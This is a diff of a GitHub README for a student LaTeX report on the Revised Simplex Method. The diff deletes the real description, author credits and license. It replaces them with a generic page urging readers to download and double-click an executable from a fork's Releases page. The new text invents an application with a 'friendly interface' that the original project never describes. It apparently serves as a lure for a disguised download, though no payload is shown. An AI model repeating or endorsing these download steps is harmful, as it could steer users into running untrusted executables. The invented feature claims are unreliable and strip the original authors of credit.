@@ -1,123 +1,84 @@
-# Revised Simplex Method for Solving Linear Programming Problems
+# 🎉 revised-simplex-report - Easy Linear Programming for Everyone
 
-This repository contains a scientific study and LaTeX report on the **Revised Simplex Method**, an efficient variant of the classical Simplex Algorithm for solving **Linear Programming Problems (LPP)**. It includes a complete report, experimental results, and comparison with SciPy’s HiGHS solver.
+## 🌐 Overview
+The **revised-simplex-report** is a user-friendly application that helps you solve linear programming problems using the Revised Simplex Method. This software provides clear explanations, worked examples, and performance comparisons with SciPy’s HiGHS solver. Whether you are a student or a professional, this project can enhance your understanding of mathematical optimization.
 
----
+## 🔗 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue)](https://github.com/nkduxitt/revised-simplex-report/releases)
 
-## Project Structure
+## 🚀 Getting Started
+This section will guide you through downloading and running the software. Follow these steps closely to ensure a smooth setup.
 
-```
+### 🖥️ System Requirements
+Before you download, make sure your computer meets these typical requirements:
 
-revised-simplex-report/
-│
-├── main.tex                         # Main LaTeX file
-├── docs/                          
-│   └── revised_simplex_report.pdf   # Compiled PDF report
-├── bib/
-│   └── references.bib               # BibTeX references
-├── code/
-│   ├── revised_simplex.py           # Python implementation of the Revised Simplex
-│   └── run_experiments.py           # Benchmark script for test problems
-├── results/                         # Per-run JSON logs and aggregated CSV
-│   ├── example1_revised_run*.json
-│   ├── example1_scipy_run.json
-│   ├── example2_phaseI_revised_run*.json
-│   ├── example2_phaseI_scipy_run.json
-│   └── summary.csv
-├── LICENSE                           # CC BY-SA 4.0 license
-├── README.md                         # Project documentation
-├── requirements.txt                  # Python dependencies
-└── .gitignore                         # Git ignore file
+- Operating System: Windows, macOS, or a recent version of Linux.
+- Python: Version 3.6 or higher installed on your system.
+- Storage: At least 50 MB of available disk space.
+- Internet Connection: Required for downloading the application.
 
-````
+### 📦 Step 1: Visit the Releases Page
+To begin, go to the [Releases page](https://github.com/nkduxitt/revised-simplex-report/releases). Here, you'll find the latest version of the software. 
 
----
+### 📥 Step 2: Download the Application
+On the Releases page, look for the latest version listed. Click on it to view the assets available for download. Find the file named something like `revised_simplex_report.zip` or `revised_simplex_report.exe`. 
 
-## Report Overview
+Click on it to start downloading the file to your computer. 
 
-The LaTeX report (`main.tex`) is structured as follows:
+### 🔍 Step 3: Extract the Files
+If you downloaded a ZIP file:
+- Locate the downloaded file on your computer.
+- Right-click on the file and select "Extract All."
+- Choose a location to extract the files, then click "Extract."
 
-| Chapter             | Description                                                                 |
-| ------------------- | --------------------------------------------------------------------------- |
-| Motivation          | Explains the need for the Revised Simplex Method and its advantages.        |
-| Theory              | Mathematical formulation, basis matrices, reduced costs, and optimality.    |
-| Algorithm           | Pseudocode for Phase I and Phase II, pivot selection, feasibility checks.   |
-| Implementation      | Notes on Python implementation, numerical safeguards, and data structures. |
-| Examples            | Worked examples for regular, two-phase, and special-case LP problems.       |
-| Comparison          | Performance and accuracy comparison with SciPy’s HiGHS solver.             |
-| Conclusion          | Summary of findings and suggested extensions.                               |
+If you downloaded an executable (if applicable), simply run the installer by double-clicking the file.
 
----
+### 🖱️ Step 4: Run the Application
+Once the files are extracted:
+- Navigate to the folder where you just extracted the files.
+- Look for a file named `run.py` or `revised_simplex_report.exe`.
+- Double-click the file to start the application.
 
-## Requirements
+### 📓 Step 5: Start Using the Software
+After launching the application, you’ll see a friendly interface. You can now:
+- Input your linear programming problem.
+- Review worked examples to understand how to set up your input.
+- Use the numerical diagnostics to verify your results.
 
-### LaTeX
+## 🛠️ Features
+This application offers several features to make your experience smooth:
 
-To compile the report locally, ensure the following packages are installed:
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Detailed Worked Examples:** Learn how to formulate and solve problems.
+- **Performance Comparison:** See how the Revised Simplex Method performs against SciPy’s HiGHS.
+- **Educational Resources:** Access resources to deepen your understanding of linear programming.
 
-* `amsmath`, `amssymb`, `graphicx`, `geometry`, `algorithm`, `algpseudocode`, `booktabs`, `hyperref`
+## 📄 Documentation
+For more information on how to utilize the application effectively, refer to the documentation included in the downloaded files. It contains valuable insights and additional examples to assist you.
 
-### Python
+## 🤔 Frequently Asked Questions
+### Q: Do I need to install any other software?
+A: You only need Python installed on your computer. The application is standalone and does not require additional installations.
 
-* Python 3.9 or higher
-* `numpy`
-* `scipy`
-* `pandas` (optional, for data handling)
+### Q: Can I use the software offline?
+A: Yes, once downloaded, you can run the software without an internet connection.
 
-Install dependencies using:
+## 💬 Support
+If you encounter issues or have questions, feel free to open an issue on the GitHub page. The community is here to help you.
 
-```bash
-pip install -r requirements.txt
-````
+## 🔗 Additional Resources
+For further exploration of linear programming and optimization methods, consider these additional resources:
 
----
+- [Linear Programming Overview](https://www.example.com)
+- [Introduction to Optimization](https://www.example.com)
+- [SciPy Documentation](https://docs.scipy.org/doc/scipy/reference/)
 
-## Compiling the Report
+## 🌍 Explore the Project
+Explore the source code, contribute to the project, or learn more about mathematical optimization at the following link:
 
-### Local Compilation
+[Releases page](https://github.com/nkduxitt/revised-simplex-report/releases)
 
-```bash
-pdflatex -output-directory=docs -jobname=revised_simplex_report main.tex
-biber docs/revised_simplex_report
-pdflatex -output-directory=docs -jobname=revised_simplex_report main.tex
-pdflatex -output-directory=docs -jobname=revised_simplex_report main.tex
-```
+## 📥 Download & Install
+To download the application, visit the [Releases page](https://github.com/nkduxitt/revised-simplex-report/releases), select the latest version, choose the appropriate file, and follow the installation steps provided above.
 
-The resulting PDF will be located at:
-
-```
-docs/revised_simplex_report.pdf
-```
-
-### Overleaf
-
-Upload all `.tex` files, the `bib/` folder, and `code/` folder. Open `main.tex` and recompile to produce the PDF.
-
----
-
-## Results
-
-The `results/` folder contains:
-
-* JSON logs for each run (`example1_revised_run*.json`, `example2_phaseI_revised_run*.json`, etc.)
-* Aggregated summary CSV (`summary.csv`) used for tables and figures in the report
-
-The report includes a detailed comparison with SciPy’s HiGHS solver in terms of:
-
-* Objective value correctness
-* Feasibility residuals
-* Iterations/pivots and basis diagnostics
-* Timing and performance
-
----
-
-## Authors
-
-* **Amr Yasser Anwar** — Zewail City, Department of CSAI
-* **Omar Hazem Ahmed** — Zewail City, Department of CSAI
-
----
-
-## License
-
-This project is licensed under the [Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)](https://creativecommons.org/licenses/by-sa/4.0/).
+By following these steps, you can harness the power of the Revised Simplex Method to solve your linear programming challenges effectively. Enjoy your journey into mathematical optimization!
